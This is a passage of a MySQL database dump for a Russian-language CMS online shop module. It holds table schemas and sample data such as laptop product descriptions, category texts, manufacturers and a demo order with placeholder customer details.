INSERT INTO `cp_modul_shop_artikel` VALUES (16, '2342342', 23, '2,6,23', 'ASUS F9E PMD-T2370', 1, 25003.00, 0.00, 'nb_asus.jpg', 'jpg', '', '<p>процессор Intel PMD-T2370 (1.73 ГГц), 12.1\\''\\'' WXGA (1280x800), Intel GMA X3100, 2048 Мб DDR II, 160 Гб, DVD-RW (Super Multi) DL, 10/100/1000 LAN, модем, 802.11a/b/g, встроенная Web-камера, сумка + мышь в комплекте</p>', '<p>Очередное поколение недорогих ноутбуков для активного мобильного использования. Новая серия F9 &ndash; это ноутбуки с диагональю экрана 12 дюймов на базе чипсета Intel. В модели применена современная интегрированная графика Intel GMA X3100, почти не уступающая по производительности дискретным видеоадаптерам младшего уровня. Встроенный оптический привод делает ноутбук более универсальным. Преимуществом данной модели также являются беспроводные интерфейсы WiFi и Bluetooth. Поворачивающаяся веб-камера в верхней крышке обеспечивает возможность общения по видео как в офисе, так и в дороге. О безопасности информации помогут позаботиться сканер отпечатков пальцев и микросхема аппаратного шифрования данных TPM. Несмотря на скромные габариты, ноутбук может похвастаться возможностью подключения к большим экранам для воспроизведения видео высокой четкости благодаря современному разъему HDMI.</p>', 2.100, 0, '', 0, 1220472000, 'Характеристики', '<p><strong>Поддерживаемые ОС:</strong>	Подлинная Microsoft&reg; Windows&reg; Vista&trade;,    Подлинная Windows&reg; XP<br />\r\n<strong>Дисплей	:</strong> Широкоформатная матрица TFT с диагональю 12.1&rdquo; и разрешением WXGA (1280х800), технологии ASUS Color Shine и ASUS Splendid<br />\r\n<strong>Процессор:</strong>	Intel&reg; Intel&reg; Core&trade; 2 Duo (Merom, Socket P; 65nm; FSB667MHz; 2MB L2 Cache; EIST; XD) | Intel&reg; Pentium&reg; Dual Core (Merom, Socket P; 65nm; FSB533MHz; 1MB L2 Cache; EIST; XD) | Intel&reg; Celeron&reg; M (Merom,Socket P; 65nm; FSB533MHz; 1MB L2 Cache; XD; Intel&reg; 64)<br />\r\n<strong>Чипсет: </strong>Mobile Intel&reg; 965GM Express Chipset + ICH8-M<br />\r\n<strong>Оперативная память: </strong>DDRII 667МГц, форм-фактор SO-DIMM. Максимальный объем &ndash; 2048МБ (2 слота)<br />\r\n<strong>Графическая система:</strong>	Интегрированная графика Intel GMA X3100, выделяемая память<br />\r\n<strong>Жесткий диск: </strong>SATA 2.5&rdquo; объемом до 250Гб (скорость вращения 5400/4200 об/мин)<br />\r\n<strong>Оптический привод:</strong>	8xDVD-SuperMulti DL с поддержкой записи двухслойных дисков<br />\r\n<strong>Звуковая система: </strong>HD Audio; 2 динамика, микрофон<br />\r\n<strong>Беспроводные интерфейсы:</strong>	Адаптер WiFi стандарта 802.11a/b/g/n, опциональный модуль Bluetooth (v2.0+EDR). Опциональный модуль 3G/3.5G+SIM card slot<br />\r\n<strong>Проводные интерфейсы:</strong>	Адаптер сетевой карты 10/100/1000Мбит/с, факс-модем 56К<br />\r\n<strong>Коммуникационные порты: </strong>3xUSB2.0, ExpressCard34|54, VGA (D-Sub), HDMI, Head-Out/SPDIF, Mic-in (mono), RJ11, RJ45<br />\r\n<strong>Карт-ридер: </strong>SD/MMC/MS/MSPro/xD<br />\r\n<strong>Мультимедиа: </strong>Веб-камера 1.3Мпикс с углом поворота 240 градусов<br />\r\n<strong>Безопасность:</strong>	Опциональный модуль аппаратного шифрования TPM, опциональный сканер отпечатков пальцев; пароль BIOS, системный пароль<br />\r\n<strong>Параметры батареи:</strong> 3	3/6/9 ячеек, 2400/4800/7800мАч<br />\r\n<strong>Адаптер питания:</strong>	Универсальный адаптер питания: 19В, 3.42А, 65Вт/100~240В, 50/60Гц<br />\r\n<strong>Размеры ноутбука:</strong>	310x224x27-34мм<br />\r\n<strong>Вес ноутбука	:</strong>2.1кг (с 6-ячеечной батарей)</p>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, 'ноутбук,asus,F9E,PMD-T2370', 0.00, 1, 5, 1, 4, '', 1, '', '', '', 0, 0);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_artikel_bilder`
-- 

CREATE TABLE `cp_modul_shop_artikel_bilder` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `ArtId` int(10) unsigned NOT NULL default '0',
  `Bild` char(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_shop_artikel_bilder`
-- 

INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (1, 16, 'nb_toshiba_satellite_a305650.jpg');
INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (2, 14, 'casio_1.jpg');
INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (3, 13, 'canon_2.jpg');
INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (4, 4, 'nb_toshiba_satellite_a3343400_1.jpg');
INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (5, 3, 'nb_toshiba_satellite_a3343400_2.jpg');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_artikel_downloads`
-- 

CREATE TABLE `cp_modul_shop_artikel_downloads` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `ArtId` varchar(255) NOT NULL,
  `Datei` varchar(255) NOT NULL,
  `DateiTyp` enum('full','update','bugfix','other') NOT NULL default 'full',
  `TageNachKauf` mediumint(5) NOT NULL default '365',
  `Bild` varchar(255) NOT NULL,
  `Titel` varchar(200) NOT NULL,
  `description` text NOT NULL,
  `Position` mediumint(3) unsigned NOT NULL default '1',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_artikel_downloads`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_artikel_kommentare`
-- 

CREATE TABLE `cp_modul_shop_artikel_kommentare` (
  `Id` int(8) unsigned NOT NULL auto_increment,
  `ArtId` int(10) unsigned NOT NULL default '0',
  `Benutzer` int(10) unsigned NOT NULL default '0',
  `Datum` int(14) unsigned NOT NULL default '0',
  `Titel` varchar(255) NOT NULL,
  `comment_text` text NOT NULL,
  `Wertung` smallint(1) unsigned NOT NULL default '0',
  `Publik` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_artikel_kommentare`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_bestellungen`
-- 

CREATE TABLE `cp_modul_shop_bestellungen` (
  `Id` int(14) unsigned NOT NULL auto_increment,
  `Benutzer` varchar(255) NOT NULL,
  `TransId` varchar(100) NOT NULL,
  `Datum` int(14) unsigned NOT NULL default '0',
  `Gesamt` decimal(7,2) NOT NULL default '0.00',
  `USt` decimal(7,2) NOT NULL default '0.00',
  `Artikel` text NOT NULL,
  `Artikel_Vars` text NOT NULL,
  `RechnungText` text NOT NULL,
  `RechnungHtml` text NOT NULL,
  `NachrichtBenutzer` text NOT NULL,
  `NachrichtAdmin` text NOT NULL,
  `Ip` varchar(200) NOT NULL,
  `ZahlungsId` mediumint(5) unsigned NOT NULL default '0',
  `VersandId` mediumint(5) unsigned NOT NULL default '0',
  `KamVon` tinytext NOT NULL,
  `Gutscheincode` int(10) default NULL,
  `Bestell_Email` varchar(255) NOT NULL,
  `Liefer_Firma` varchar(100) NOT NULL,
  `Liefer_Abteilung` varchar(100) NOT NULL,
  `Liefer_Vorname` varchar(100) NOT NULL,
  `Liefer_Nachname` varchar(100) NOT NULL,
  `Liefer_Strasse` varchar(100) NOT NULL,
  `Liefer_Hnr` varchar(10) NOT NULL,
  `Liefer_PLZ` varchar(15) NOT NULL,
  `Liefer_Ort` varchar(100) NOT NULL,
  `Liefer_Land` char(2) NOT NULL,
  `Rech_Firma` varchar(100) NOT NULL,
  `Rech_Abteilung` varchar(100) NOT NULL,
  `Rech_Vorname` varchar(100) NOT NULL,
  `Rech_Nachname` varchar(100) NOT NULL,
  `Rech_Strasse` varchar(100) NOT NULL,
  `Rech_Hnr` varchar(10) NOT NULL,
  `Rech_PLZ` varchar(15) NOT NULL,
  `Rech_Ort` varchar(100) NOT NULL,
  `Rech_Land` char(2) NOT NULL,
  `Status` enum('wait','progress','ok','ok_send','failed') NOT NULL default 'wait',
  `DatumBezahlt` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_shop_bestellungen`
-- 

INSERT INTO `cp_modul_shop_bestellungen` VALUES (1, '1', '56GUXDT270410', 1272334373, 1.00, 0.00, 'a:1:{i:17;i:1;}', '', '=================================================\r\nПодтверждение заказа\r\n=================================================\r\n\r\nПри заказе вы получите подтверждение покупки товара.Обратите внимание этот документ не является официальным счетом. При получении товара вы получите счет который можно будет использовать в финансовой отчетности. \r\n=================================================\r\n\r\nАдрес доставки заказа\r\n=================================================\r\nД\\''артаньян\r\n123-45-67\r\nД\\''артаньян Д\\''артаньян\r\n\r\nД\\''артаньян 1\r\n1234567 Д\\''артаньян\r\nRU\r\n\r\n\r\nАдрес доставки счета\r\n=================================================\r\nСовпадает с адресом доставки заказа\r\n#################################################\r\nПлеер 1by1 (Арт. №: sdfsdw332) На следующий день по Москве\r\nКоличество: 1\r\nЦена: 1 р\r\nСумма: 1 р\r\n#################################################\r\n\r\nНомер заказа: 1\r\nДата заказа: 27.04.2010, 06:12:53\r\nКод транзакции: 56GUXDT270410\r\n\r\nВид отправки: Курьером по москве\r\nВид оплаты: Наличными курьеру\r\n\r\nСтоимость товаров: 1 р\r\nУпаковка и отправка: 0 р\r\n\r\nОбщая оплата: 0 р\r\nИтоговая сумма: 1 р\r\n=================================================\r\n\r\n=================================================\r\n\r\n\r\nВажная информация о оплате\r\nНаличными курьеру\r\nНаличные при получении (по Москве) - оплата осуществляется наличными деньгами курьеру в момент доставки. После комплектации заказа наш менеджер свяжется с Вами по контактному телефону и еще раз уточнит параметры заказа и Ваш адрес. Если Вы, подтвердив заказ, в дальнейшем отказываетесь от его получения, то Вам необходимо оплатить стоимость доставки + 50 руб за каждую возвращенную позицию. В случае необходимости возврата или обмена изделия свяжитесь с нашим менеджером.\r\n\r\n\r\nУ вас есть вопросы? Обратитесь к нашим менеджерам.\r\n', '<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251" /><title></title></head>\r\n<style type="text/css">\r\nhtml, body, td, div, th {\r\n	font:11px Verdana,Arial,Helvetica,sans-serif;\r\n}\r\n.articlesborder {\r\n	background-color:#ccc;\r\n}\r\n.articlesrow {\r\n	background-color:#fff;\r\n}\r\n.articlesheader {\r\n	background-color:#eee;\r\n}\r\n.overall {\r\n	background-color:#eee;\r\n	font-size:14px;\r\n	border-top:1px solid #ccc;\r\n}\r\n</style>\r\n<body><div id="shopcontent"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td></td><td align="right"></td></tr></table><hr noshade="noshade" size="1"><h3><strong>Подтверждение заказа</strong></h3>При заказе вы получите подтверждение покупки товара.<br />Обратите внимание этот документ не является официальным счетом. При получении товара вы получите счет который можно будет использовать в финансовой отчетности. <hr noshade="noshade" size="1"><table width="100%"><tr><td valign="top"><h3><strong>Адрес доставки заказа</strong></h3><strong>Д\\''артаньян</strong><br />123-45-67<br />Д\\''артаньян Д\\''артаньян<br /><br />Д\\''артаньян 1<br />1234567 Д\\''артаньян<br />RU<br /></td><td valign="top"><h3><strong>Адрес доставки счета</strong></h3>Совпадает с адресом доставки заказа</td></tr><tr><td valign="top">&nbsp;<br /><br /></td><td valign="top">&nbsp;</td></tr></table><table width="100%" border="0" cellpadding="3" cellspacing="1" class="articlesborder"><tr><td valign="top" class="articlesheader"><strong>Артикул</strong></td><td valign="top" class="articlesheader"><strong>Арт. №</strong></td><td valign="top" align="right" class="articlesheader"><strong>Количество</strong></td><td align="right" valign="top" class="articlesheader"><strong>Цена</strong></td><td align="right" valign="top" class="articlesheader"><strong>Сумма</strong></td></tr><tr><td valign="top" class="articlesrow"> <strong>Плеер 1by1</strong><!-- DELIVERY TIME --><div class="mod_shop_timetillshipping">На следующий день по Москве</div><!-- /DELIVERY TIME --><!-- PRODUCT VARIATIONS --><!-- /PRODUCT VARIATIONS --></td><td valign="top" class="articlesrow">sdfsdw332</td><td align="center" valign="top" class="articlesrow">1</td><td align="right" valign="top" class="articlesrow" nowrap="nowrap">1 р</td><td align="right" valign="top" class="articlesrow" nowrap="nowrap">1 р</td></tr></table><br /><br /><table width="100%" border="0" cellspacing="0" cellpadding="1"><tr><td>Номер заказа:</td><td class="mod_shop_summlist">1</td></tr><tr><td>Дата заказа:</td><td class="mod_shop_summlist">27.04.2010, 06:12:53</td></tr><tr><td class="mod_shop_summlist">Код транзакции:</td><td class="mod_shop_summlist">56GUXDT270410</td></tr><tr><td class="mod_shop_summlist">&nbsp;</td><td class="mod_shop_summlist">&nbsp;</td></tr><tr><td width="200">Вид отправки:</td><td class="mod_shop_summlist">Курьером по москве</td></tr><tr><td width="200">Вид оплаты:</td><td class="mod_shop_summlist">Наличными курьеру</td></tr><tr><td width="200" class="mod_shop_summlist">&nbsp;</td><td align="right" class="mod_shop_summlist">&nbsp;</td></tr><tr><td width="200"><strong>Стоимость товаров:</strong></td><td class="mod_shop_summlist"><strong>1 р</strong></td></tr><tr><td width="200">Упаковка и отправка:</td><td> 0 р</td></tr><tr><td width="200" class="overall"><strong>Итоговая сумма:</strong></td><td class="overall"><strong>1 р</strong><br /><span class="mod_shop_ust">1 €</span></td></tr><tr><td width="200">&nbsp;</td><td>&nbsp;</td></tr></table><hr noshade="noshade" size="1"><h3>Важная информация о оплате</h3><strong>Наличными курьеру</strong><br /><em>Наличные при получении (по Москве) - оплата осуществляется наличными деньгами курьеру в момент доставки. После комплектации заказа наш менеджер свяжется с Вами по контактному телефону и еще раз уточнит параметры заказа и Ваш адрес. Если Вы, подтвердив заказ, в дальнейшем отказываетесь от его получения, то Вам необходимо оплатить стоимость доставки + 50 руб за каждую возвращенную позицию. В случае необходимости возврата или обмена изделия свяжитесь с нашим менеджером.</em><hr noshade="noshade" size="1"><strong>У вас есть вопросы? Обратитесь к нашим менеджерам.</strong><br /></td></tr></table></div></body></html>', '', '', '127.0.0.1', 1, 1, '', 0, 'admin@ave.ru', 'Д''артаньян', '', 'Д''артаньян', 'Д''артаньян', 'Д''артаньян', '1', '1234567', 'Д''артаньян', 'RU', 'Д''артаньян', '', 'Д''артаньян', 'Д''артаньян', 'Д''артаньян', '1', '1234567', 'Д''артаньян', '', 'wait', 0);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_downloads`
-- 

CREATE TABLE `cp_modul_shop_downloads` (
  `Id` int(11) unsigned NOT NULL auto_increment,
  `Benutzer` int(11) NOT NULL default '0',
  `PName` varchar(255) NOT NULL,
  `ArtikelId` varchar(50) NOT NULL,
  `DownloadBis` int(11) NOT NULL default '0',
  `Lizenz` varchar(20) NOT NULL,
  `Downloads` int(11) NOT NULL default '0',
  `UrlLizenz` varchar(255) NOT NULL,
  `KommentarBenutzer` text NOT NULL,
  `KommentarAdmin` text NOT NULL,
  `Gesperrt` tinyint(1) NOT NULL default '0',
  `GesperrtGrund` text NOT NULL,
  `Position` smallint(2) NOT NULL default '1',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_downloads`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_einheiten`
-- 

CREATE TABLE `cp_modul_shop_einheiten` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Name` char(100) NOT NULL,
  `NameEinzahl` char(255) NOT NULL,
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Name` (`Name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_einheiten`
-- 

INSERT INTO `cp_modul_shop_einheiten` VALUES (1, 'штука', 'штука');
INSERT INTO `cp_modul_shop_einheiten` VALUES (2, 'десяток', 'десяток');
INSERT INTO `cp_modul_shop_einheiten` VALUES (3, 'литр', 'литр');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_gutscheine`
-- 

CREATE TABLE `cp_modul_shop_gutscheine` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Code` varchar(100) NOT NULL,
  `Prozent` decimal(4,2) NOT NULL default '10.00',
  `Mehrfach` tinyint(1) unsigned NOT NULL default '1',
  `Benutzer` text NOT NULL,
  `Eingeloest` int(14) unsigned NOT NULL default '0',
  `BestellId` text NOT NULL,
  `GueltigVon` int(14) unsigned NOT NULL default '0',
  `GueltigBis` int(14) unsigned NOT NULL default '0',
  `AlleBenutzer` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Code` (`Code`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_gutscheine`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_hersteller`
-- 

CREATE TABLE `cp_modul_shop_hersteller` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `Name` char(255) NOT NULL,
  `Link` char(255) NOT NULL,
  `Logo` char(255) NOT NULL,
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Name` (`Name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_hersteller`
-- 

INSERT INTO `cp_modul_shop_hersteller` VALUES (1, 'HP', 'www.hp.ru', 'uploads/manufacturer/icon_hp.gif');
INSERT INTO `cp_modul_shop_hersteller` VALUES (2, 'Asus', 'www.asus.com', 'uploads/manufacturer/icon_asus.gif');
INSERT INTO `cp_modul_shop_hersteller` VALUES (3, 'Acer', 'www.acer.com', 'uploads/manufacturer/icon_acer.gif');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_kategorie`
-- 

CREATE TABLE `cp_modul_shop_kategorie` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `parent_id` mediumint(5) unsigned NOT NULL default '0',
  `KatName` varchar(100) NOT NULL,
  `KatBeschreibung` text NOT NULL,
  `position` smallint(3) unsigned NOT NULL default '1',
  `Bild` varchar(255) NOT NULL,
  `bid` int(5) unsigned NOT NULL default '0',
  `cbid` int(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `KatName` (`KatName`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_shop_kategorie`
-- 

INSERT INTO `cp_modul_shop_kategorie` VALUES (1, 0, 'Принтеры', 'ПЕЧАТАЮЩЕЕ УСТРОЙСТВО (ПРИНТЕР) &mdash; устройство для регистрации (печати) текста или графической информации на носителе, в основном, на бумаге. П. у. в зависимости от применяемого принципа печати бывают лазерные, игольчатые, струйные, на базе использования принципа термопечати с применением термоленты.<br />', 2, 'icon_printer.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (2, 0, 'Ноутбуки', 'НОУТБУК (от англ. notebook - записная книжка, тетрадь) - переносной портативный компьютер. Описание категории. Правится в админке - модули - магазин - категории.&nbsp;Описание категории. Правится в админке - модули - магазин - категории.&nbsp;Описание категории. Правится в админке - модули - магазин - категории.&nbsp;Описание категории. Правится в админке - модули - магазин - категории.&nbsp;<br />', 1, 'icon_note.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (3, 0, 'Фотоехника', '<br />', 3, 'icon_camer.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (4, 0, 'Программы', '<br />', 4, 'icon_xp.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (5, 0, 'Книги', '<br />', 5, 'icon_book.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (6, 2, 'Экран 10''—12''', '<br />', 1, 'icon_10_12.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (10, 4, 'Под Windows', '<br />', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (11, 10, 'Мультимедиа', '<br />', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (12, 11, 'Аудио', '<br />', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (13, 12, 'Плееры', '<br />', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (22, 2, 'Ноутбуки HP', 'HP (Hewlett-Packard) это мировой поставщик ключевых технологий для корпоративных заказчиков и конечных пользователей. Компания HP предоставляет решения в области ИТ-инфраструктуры, персональных вычислительных систем и устройств доступа, услуги по системно&nbsp;', 5, 'icon_hp.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (19, 2, 'Экран 13''—14''', 'Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;Описание подкатегории &nbsp;', 2, 'icon_13_14.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (20, 2, 'Экран 15''—16.4''', '&nbsp;Описание категории. Правится в админке - модули - магазин - категории.&nbsp;Описание категории. Правится в админке - модули - магазин - категории.&nbsp;Описание категории. Правится в админке - модули - магазин - категории.&nbsp;Описание категории. Правится в админке - модули - магазин - категории.&nbsp;Описание категории. Правится в админке - модули - магазин - категории.&nbsp;Описание категории. Правится в админке - модули - магазин - категории.&nbsp;', 3, 'icon_15_16.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (21, 2, 'Экран 17'' и более', 'Описание категории. Правится в админке - модули - магазин - категории. &nbsp;Описание категории. Правится в админке - модули - магазин - категории. &nbsp;Описание категории. Правится в админке - модули - магазин - категории. &nbsp;Описание категории. Правится в админке - модули - магазин - категории. &nbsp;Описание категории. Правится в админке - модули - магазин - категории. &nbsp;Описание категории. Правится в админке - модули - магазин - категории. &nbsp;', 4, 'icon_17.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (23, 2, 'Ноутбуки Asus', '&nbsp;Ноутбуки Asus превосходят многие мощные настольные компьютеры по расширяемости и поддержке различных интерфейсов. Это ноутбуки для широкого круга пользователей, обладающие наивысшей производительностью в любых приложениях. ASUS является лидирующим поставщ', 8, 'icon_asus.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (24, 2, 'Ноутбуки Acer', 'зарубежных странах ноутбуки Acer также занимают лидирующие позиции продаж. Под &quot;властью&quot; отличных технических характеристик и различных дизайнерских решений этих мобильных ПК оказались Италия, Испания, Германия, Бельгия, Австрия, Чехия. Мировое признание&nbsp;', 9, 'icon_acer.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (25, 1, 'Струйные', 'СТРУЙНОЕ ПЕЧАТАЮЩЕЕ УСТРОЙСТВО (СТРУЙНЫЙ ПРИНТЕР) &mdash; периферийное устройство компьютерной системы, в котором для печати используется механизм разбрызгивания чернил из капиллярных сопел.&nbsp;', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (26, 1, 'Твердочернильные', 'ПРИНТЕР НА ТВЕРДЫХ ЧЕРНИЛАХ &mdash; струйный принтер, в котором использована т. н. технология смены фаз, построенная на эффекте смены агрегатного состояния красителя в процессе печатания.&nbsp;', 2, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (27, 5, 'Учебники', 'Учебник - учебное издание:\n<ul>\n    <li>содержащее систематическое изложение учебной дисциплины, ее раздела или части;&nbsp;</li>\n    <li>соответствующее учебной программе; и&nbsp;</li>\n    <li>официально утвержденное в качестве учебника</li>\n</ul>', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (28, 3, 'Цифровые фотоаппараты', 'Электронный фотоаппарат - фотоаппарат, в котором запоминание изображения осуществляется специальной интегральной микросхемой, которая состоит из:\r\n<ul>\r\n    <li>резисторов, преобразующих свет в электрический сигнал; и</li>\r\n    <li>приборов с зарядовой связью, сохраняющих электрический аналоговый сигнал нужное время.</li>\r\n</ul>\r\nПосле аналого-дискретного преобразования сигнал передается в запоминающее устройство фотоаппарата. <br />\r\n<br />\r\nЧерно-белый электронный фотоаппарат имеет одну микросхемы, цветной - три микросхемы.', 1, '', 0, 0);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_kundenrabatte`
-- 

CREATE TABLE `cp_modul_shop_kundenrabatte` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `GruppenId` smallint(3) unsigned NOT NULL default '0',
  `Wert` decimal(7,2) unsigned NOT NULL default '0.00',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `GruppenId` (`GruppenId`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_kundenrabatte`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_merkliste`
-- 

CREATE TABLE `cp_modul_shop_merkliste` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Benutzer` int(10) unsigned NOT NULL default '0',
  `Ip` varchar(200) NOT NULL,
  `Inhalt` text NOT NULL,
  `Inhalt_Vars` text NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_merkliste`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_staffelpreise`
-- 

CREATE TABLE `cp_modul_shop_staffelpreise` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `ArtId` int(10) unsigned NOT NULL default '0',
  `StkVon` mediumint(5) NOT NULL default '2',
  `StkBis` mediumint(5) NOT NULL default '5',
  `Preis` decimal(10,2) NOT NULL default '0.00',
  PRIMARY KEY  (`Id`),
  KEY `ArtId` (`ArtId`),
  KEY `Preis` (`Preis`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_staffelpreise`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_ust`
-- 

CREATE TABLE `cp_modul_shop_ust` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `Name` char(100) NOT NULL,
  `Wert` decimal(4,2) NOT NULL default '16.00',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_ust`
-- 

INSERT INTO `cp_modul_shop_ust` VALUES (1, 'НДС', 18.00);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_varianten`
-- 

CREATE TABLE `cp_modul_shop_varianten` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `KatId` int(10) unsigned NOT NULL default '0',
  `ArtId` int(10) unsigned NOT NULL default '0',
  `Name` char(255) NOT NULL,
  `Wert` decimal(7,2) NOT NULL default '0.00',
  `Operant` enum('+','-') NOT NULL default '+',
  `Position` smallint(3) unsigned NOT NULL default '1',
  `Vorselektiert` enum('0','1') NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `KatId` (`KatId`),
  KEY `ArtId` (`ArtId`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_varianten`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_varianten_kategorien`
-- 

CREATE TABLE `cp_modul_shop_varianten_kategorien` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `KatId` mediumint(5) unsigned NOT NULL default '0',
  `Name` varchar(200) NOT NULL,
  `description` text NOT NULL,
  `status` tinyint(1) unsigned NOT NULL default '1',
  PRIMARY KEY  (`Id`),
  KEY `KatId` (`KatId`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_varianten_kategorien`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_versandarten`
-- 

CREATE TABLE `cp_modul_shop_versandarten` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Name` varchar(200) NOT NULL default '',
  `description` text NOT NULL,
  `Icon` varchar(255) NOT NULL default '',
  `LaenderVersand` tinytext NOT NULL,
  `Pauschalkosten` decimal(5,2) NOT NULL default '0.00',
  `KeineKosten` tinyint(1) unsigned NOT NULL default '0',
  `Aktiv` tinyint(1) unsigned NOT NULL default '0',
  `NurBeiGewichtNull` tinyint(1) unsigned NOT NULL default '0',
  `ErlaubteGruppen` tinytext NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop_versandarten`
-- 

INSERT INTO `cp_modul_shop_versandarten` VALUES (1, 'Курьером по москве', '<br />', '', 'BY,RU,UA', 300.00, 1, 1, 0, '1,2,4,3');
